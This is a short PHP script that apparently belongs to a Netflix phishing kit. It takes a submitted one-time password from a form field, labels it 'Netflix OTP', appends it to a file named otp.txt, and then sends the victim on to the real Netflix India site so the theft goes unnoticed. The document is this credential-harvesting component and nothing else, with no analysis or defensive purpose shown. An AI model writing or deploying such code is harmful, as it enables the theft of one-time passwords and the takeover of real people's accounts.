<?php
file_put_contents("otp.txt", "Netflix OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com/in/');
?>
